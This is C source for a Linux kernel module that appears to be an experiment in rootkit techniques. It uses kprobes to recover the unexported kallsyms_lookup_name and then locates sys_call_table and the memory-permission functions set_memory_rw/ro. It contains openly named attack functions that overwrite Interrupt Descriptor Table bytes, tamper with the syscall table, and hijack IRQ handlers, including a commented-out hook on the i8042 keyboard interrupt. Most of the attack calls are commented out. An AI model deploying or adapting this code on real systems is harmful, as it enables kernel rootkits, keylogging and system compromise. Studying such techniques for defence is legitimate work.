#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/syscalls.h>
#include <asm/desc.h>
#include <linux/irq.h>
#include <linux/interrupt.h> 
#include <linux/kprobes.h>

#define KPROBE_PRE_HANDLER(fname) static int __kprobes fname(struct kprobe *p, struct pt_regs *regs)

long unsigned int kln_addr = 0;
unsigned long (*kln_pointer)(const char *name) = NULL;

int (*set_memory_pointer)(unsigned long, int);
int (*reset_memory_pointer)(unsigned long, int);

struct irq_desc *(*i2d_pointer)(int irq) = NULL; /* irq_to_desc function pointer */
struct irqaction *keyboard_action;

static struct kprobe kp0, kp1;

KPROBE_PRE_HANDLER(handler_pre0)
{
  kln_addr = (--regs->ip);
  
  return 0;
}

KPROBE_PRE_HANDLER(handler_pre1)
{
  return 0;
}

static int do_register_kprobe(struct kprobe *kp, char *symbol_name, void *handler)
{
  int ret;
  
  kp->symbol_name = symbol_name;
  kp->pre_handler = handler;
  
  ret = register_kprobe(kp);
  if (ret < 0) {
    pr_err("register_probe() for symbol %s failed, returned %d\n", symbol_name, ret);
    return ret;
  }
  pr_info("Planted kprobe for symbol %s at %p\n", symbol_name, kp->addr);
  return ret;
}

irqreturn_t (*old_handler)(int irq, void *dev) = NULL;
static irqreturn_t hook_handler(int irq, void *dev){
    printk("Hooked myself MALE MALE MALE !!!\n");
    return old_handler(irq, dev);
}

irqreturn_t (*old_keyboard)(int irq, void *dev) = NULL;
static irqreturn_t hook_keyboard(int irq, void *dev){
    printk("Hooked keyboard !!!\n");
    return old_keyboard(irq, dev);
}

static void walk_irqactions(int irq)
{
    struct irq_desc *desc;
    struct irqaction *action, **action_ptr;

    desc = i2d_pointer(irq);
    if(desc == NULL)
        return;
    action_ptr = &desc->action;       
    if(action_ptr != NULL)                                       
        action = *action_ptr; 
    else
        action = NULL;
    while(action != NULL){
        if(!strcmp("fx_irq_handler", action->name)){
            printk("IRQ: %d, Action name: %s, address: %px\n", action->irq, (action->name == NULL) ? "no name":action->name, (void *)action);
            printk("Trying hooking fx_irq_handler\n");
            old_handler = action->handler;
            action->handler = hook_handler;
        }
        /*
        if(!strcmp("i8042", action->name)){
            printk("Trying hooking keyboard\n");
            old_keyboard = action->handler;
            action->handler = hook_keyboard;
            keyboard_action = action;
        }
        */
        action = action->next;
    }
}

static void init_set_memory_functions(void)
{
    set_memory_pointer = (int (*)(unsigned long, int))kln_pointer("set_memory_rw");
    reset_memory_pointer = (int (*)(unsigned long, int))kln_pointer("set_memory_ro");
}

static void idt_attack_test(struct desc_ptr *descriptor)
{
    char *ptr;

    set_memory_pointer(descriptor->address, 1);
    ptr = (char *)descriptor->address;
    *(ptr + 5) = 6;
    reset_memory_pointer(descriptor->address, 1);
    return;
}

/*  this function cause kernel panic, 
    system call table is marked read only 

static void sys_call_table_attack(void) 
{
    char *my_syscall_ref = (char *)kln_pointer("sys_call_table");
    *(my_syscall_ref + 5) = 7;
}
*/
/*

static void sys_call_table_remapping_attack(void)
{
    void *my_syscall_ptr;
    u64 phys_address;
    my_syscall_ptr = (void *)obtain_syscall_table_bf();
    phys_address = virt_to_phys(my_syscall_ptr);
    printk("sys_call_table address = %px, physical = %llx\n", my_syscall_ptr, phys_address);
}
*/
static int m_init(void)
{
    int ret, i;
    struct desc_ptr *idt_ptr;

    pr_info("module loaded\n");


    ret = do_register_kprobe(&kp0, "kallsyms_lookup_name", handler_pre0);
    if (ret < 0)
    return ret;

    ret = do_register_kprobe(&kp1, "kallsyms_lookup_name", handler_pre1);
    if (ret < 0) {
    unregister_kprobe(&kp0);
    return ret;
    }

    unregister_kprobe(&kp0);
    unregister_kprobe(&kp1);  
    kln_pointer = (unsigned long (*)(const char *name)) kln_addr;
    /*
    i2d_pointer = (struct irq_desc *(*)(int))(kln_pointer("irq_to_desc"));
    printk("i2d pointer: %px\n", i2d_pointer);
    for(i = 0; i < 256; i++)
        walk_irqactions(i);
    */
    init_set_memory_functions();
    idt_ptr = kmalloc(sizeof(struct desc_ptr), GFP_KERNEL);
    store_idt(idt_ptr);
    //printk("Writing IDT\n");
    //idt_attack_test(idt_ptr);
    kfree(idt_ptr);

    printk("sys close = %px\n", (void *)kln_pointer("sys_call_table"));
    //sys_call_table_remapping_attack();

    return 0;
}

static void m_exit(void)
{
  //keyboard_action->handler = old_keyboard;
  pr_info("module unloaded\n");
}

module_init(m_init);
module_exit(m_exit);

MODULE_LICENSE("GPL");

